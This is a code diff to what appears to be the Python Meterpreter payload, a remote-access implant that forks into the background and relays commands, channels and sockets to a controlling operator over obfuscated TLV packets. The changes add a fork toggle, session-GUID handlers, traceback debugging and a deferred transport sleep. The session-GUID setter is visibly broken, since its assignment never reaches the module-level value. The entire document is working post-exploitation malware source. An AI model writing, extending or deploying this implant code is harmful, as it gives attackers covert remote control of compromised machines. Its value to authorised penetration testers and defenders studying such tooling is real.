@@ -60,10 +60,12 @@ random.seed()
 
 # these values will be patched, DO NOT CHANGE THEM
 DEBUGGING = False
+TRY_TO_FORK = True
 HTTP_CONNECTION_URL = None
 HTTP_PROXY = None
 HTTP_USER_AGENT = None
 PAYLOAD_UUID = ''
+SESSION_GUID = ''
 SESSION_COMMUNICATION_TIMEOUT = 300
 SESSION_EXPIRATION_TIMEOUT = 604800
 SESSION_RETRY_TOTAL = 3600
@@ -157,9 +159,7 @@ TLV_TYPE_TRANS_GROUP           = TLV_META_TYPE_GROUP   | 441
 
 TLV_TYPE_MACHINE_ID            = TLV_META_TYPE_STRING  | 460
 TLV_TYPE_UUID                  = TLV_META_TYPE_RAW     | 461
-
-TLV_TYPE_CIPHER_NAME           = TLV_META_TYPE_STRING  | 500
-TLV_TYPE_CIPHER_PARAMETERS     = TLV_META_TYPE_GROUP   | 501
+TLV_TYPE_SESSION_GUID          = TLV_META_TYPE_RAW     | 462
 
 TLV_TYPE_PEER_HOST             = TLV_META_TYPE_STRING  | 1500
 TLV_TYPE_PEER_PORT             = TLV_META_TYPE_UINT    | 1501
@@ -226,6 +226,13 @@ def crc16(data):
 def debug_print(msg):
 	if DEBUGGING:
 		print(msg)
+
+@export
+def debug_traceback(msg=None):
+	if DEBUGGING:
+		if msg:
+			print(msg)
+		traceback.print_exc(file=sys.stderr)
 
 @export
 def error_result(exception=None):
@@ -513,6 +520,7 @@ class Transport(object):
 		try:
 			pkt = self._get_packet()
 		except:
+			debug_traceback()
 			return None
 		if pkt is None:
 			return None
@@ -526,6 +534,7 @@ class Transport(object):
 			raw = struct.pack('BBBB', *xor_key[::-1]) + xor_bytes(xor_key, pkt)
 			self._send_packet(raw)
 		except:
+			debug_traceback()
 			return False
 		self.communication_last = time.time()
 		return True
@@ -681,7 +690,7 @@ class TcpTransport(Transport):
 		first = self._first_packet
 		self._first_packet = False
 		if not select.select([self.socket], [], [], 0.5)[0]:
-			return ''
+			return bytes()
 		packet = self.socket.recv(12)
 		if packet == '':  # remote is closed
 			self.request_retire = True
@@ -723,6 +732,7 @@ class TcpTransport(Transport):
 class PythonMeterpreter(object):
 	def __init__(self, transport):
 		self.transport = transport
+		self._transport_sleep = None
 		self.running = False
 		self.last_registered_extension = None
 		self.extension_functions = {}
@@ -745,6 +755,12 @@ class PythonMeterpreter(object):
 	def register_function(self, func):
 		self.extension_functions[func.__name__] = func
 		return func
+
+	def register_function_if(self, condition):
+		if condition:
+			return self.register_function
+		else:
+			return lambda function: function
 
 	def register_function_windll(self, func):
 		if has_windll:
@@ -821,6 +837,12 @@ class PythonMeterpreter(object):
 				response = self.create_response(request)
 				if response:
 					self.send_packet(response)
+				if self._transport_sleep:
+					self.transport.deactivate()
+					time.sleep(self._transport_sleep)
+					self._transport_sleep = None
+					if not self.transport.activate():
+						self.transport_change()
 				continue
 			# iterate over the keys because self.channels could be modified if one is closed
 			channel_ids = list(self.channels.keys())
@@ -853,7 +875,7 @@ class PythonMeterpreter(object):
 						client_channel_id = self.add_channel(MeterpreterSocketClient(client_sock))
 						pkt  = struct.pack('>I', PACKET_TYPE_REQUEST)
 						pkt += tlv_pack(TLV_TYPE_METHOD, 'tcp_channel_open')
-						pkt += tlv_pack(TLV_TYPE_UUID, binascii.a2b_hex(PAYLOAD_UUID))
+						pkt += tlv_pack(TLV_TYPE_UUID, binascii.a2b_hex(bytes(PAYLOAD_UUID, 'UTF-8')))
 						pkt += tlv_pack(TLV_TYPE_CHANNEL_ID, client_channel_id)
 						pkt += tlv_pack(TLV_TYPE_CHANNEL_PARENTID, channel_id)
 						pkt += tlv_pack(TLV_TYPE_LOCAL_HOST, inet_pton(channel.family, server_addr[0]))
@@ -865,7 +887,7 @@ class PythonMeterpreter(object):
 				if data:
 					pkt  = struct.pack('>I', PACKET_TYPE_REQUEST)
 					pkt += tlv_pack(TLV_TYPE_METHOD, 'core_channel_write')
-					pkt += tlv_pack(TLV_TYPE_UUID, binascii.a2b_hex(PAYLOAD_UUID))
+					pkt += tlv_pack(TLV_TYPE_UUID, binascii.a2b_hex(bytes(PAYLOAD_UUID, 'UTF-8')))
 					pkt += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
 					pkt += tlv_pack(TLV_TYPE_CHANNEL_DATA, data)
 					pkt += tlv_pack(TLV_TYPE_LENGTH, len(data))
@@ -879,7 +901,7 @@ class PythonMeterpreter(object):
 			self.interact_channels.remove(channel_id)
 		pkt  = struct.pack('>I', PACKET_TYPE_REQUEST)
 		pkt += tlv_pack(TLV_TYPE_METHOD, 'core_channel_close')
-		pkt += tlv_pack(TLV_TYPE_UUID, binascii.a2b_hex(PAYLOAD_UUID))
+		pkt += tlv_pack(TLV_TYPE_UUID, binascii.a2b_hex(bytes(PAYLOAD_UUID, 'UTF-8')))
 		pkt += tlv_pack(TLV_TYPE_REQUEST_ID, generate_request_id())
 		pkt += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
 		pkt  = struct.pack('>I', len(pkt) + 4) + pkt
@@ -896,6 +918,16 @@ class PythonMeterpreter(object):
 		for func_name in self.extension_functions.keys():
 			if func_name.split('_', 1)[0] == extension_name:
 				response += tlv_pack(TLV_TYPE_STRING, func_name)
+		return ERROR_SUCCESS, response
+
+	def _core_get_session_guid(self, request, response):
+		response += tlv_pack(TLV_TYPE_SESSION_GUID, SESSION_GUID)
+		return ERROR_SUCCESS, response
+
+	def _core_set_session_guid(self, request, response):
+		new_guid = packet_get_tlv(request, TLV_TYPE_SESSION_GUID)
+		if new_guid:
+			SESSION_GUID = new_guid['value']
 		return ERROR_SUCCESS, response
 
 	def _core_machine_id(self, request, response):
@@ -1038,11 +1070,8 @@ class PythonMeterpreter(object):
 		seconds = packet_get_tlv(request, TLV_TYPE_TRANS_COMM_TIMEOUT)['value']
 		self.send_packet(tlv_pack_response(ERROR_SUCCESS, response))
 		if seconds:
-			self.transport.deactivate()
-			time.sleep(seconds)
-			if not self.transport.activate():
-				self.transport_change()
-		return None
+			self._transport_sleep = seconds
+		return ERROR_SUCCESS, response
 
 	def _core_channel_open(self, request, response):
 		channel_type = packet_get_tlv(request, TLV_TYPE_CHANNEL_TYPE)
@@ -1149,7 +1178,7 @@ class PythonMeterpreter(object):
 		resp = struct.pack('>I', PACKET_TYPE_RESPONSE)
 		method_tlv = packet_get_tlv(request, TLV_TYPE_METHOD)
 		resp += tlv_pack(method_tlv)
-		resp += tlv_pack(TLV_TYPE_UUID, binascii.a2b_hex(PAYLOAD_UUID))
+		resp += tlv_pack(TLV_TYPE_UUID, binascii.a2b_hex(bytes(PAYLOAD_UUID, 'UTF-8')))
 
 		handler_name = method_tlv['value']
 		if handler_name in self.extension_functions:
@@ -1161,9 +1190,7 @@ class PythonMeterpreter(object):
 					return
 				result, resp = result
 			except Exception:
-				debug_print('[-] method ' + handler_name + ' resulted in an error')
-				if DEBUGGING:
-					traceback.print_exc(file=sys.stderr)
+				debug_traceback('[-] method ' + handler_name + ' resulted in an error')
 				result = error_result()
 			else:
 				if result != ERROR_SUCCESS:
@@ -1178,7 +1205,8 @@ class PythonMeterpreter(object):
 		resp += tlv_pack(reqid_tlv)
 		return tlv_pack_response(result, resp)
 
-if not hasattr(os, 'fork') or (hasattr(os, 'fork') and os.fork() == 0):
+_try_to_fork = TRY_TO_FORK and hasattr(os, 'fork')
+if not _try_to_fork or (_try_to_fork and os.fork() == 0):
 	if hasattr(os, 'setsid'):
 		try:
 			os.setsid()
